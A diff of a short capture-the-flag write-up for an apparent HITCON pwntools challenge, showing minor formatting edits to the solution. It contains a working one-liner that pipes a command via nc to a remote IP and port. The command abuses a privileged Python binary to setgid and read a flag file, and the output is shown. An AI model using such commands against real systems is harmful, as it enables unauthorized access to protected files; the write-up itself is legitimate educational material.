@@ -9,7 +9,7 @@ Categories:
 ## Solution
 
 ```
-printf $'131\n/home/deploy/secret_python_others_should_never_know -c \'__import__("os").setgid(1001);print(open("/home/deploy/flag").read())\' 1>&2\n' | nc 3.115.58.219 9427
+$ printf $'131\n/home/deploy/secret_python_others_should_never_know -c \'__import__("os").setgid(1001);print(open("/home/deploy/flag").read())\' 1>&2\n' | nc 3.115.58.219 9427
 ELF size? (MAX: 6144)
 [*] Version of pwntools: 4.3.0
 [x] Opening connection to 127.0.0.1 on port 1337
@@ -20,7 +20,7 @@ hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
 
 ## Explanation
 
-So basically I think we were supposed to abuse pwntools `asm` function, but I'm pretty lazy.
+So basically I think we were supposed to abuse pwntools `asm` function, but I'm pretty lazy
 
 Since we basiclaly have a shell by sending `len(cmd) + "\n" + cmd` to the socket (it executes with `bash` instead of as an ELF), I explored a little first:
 
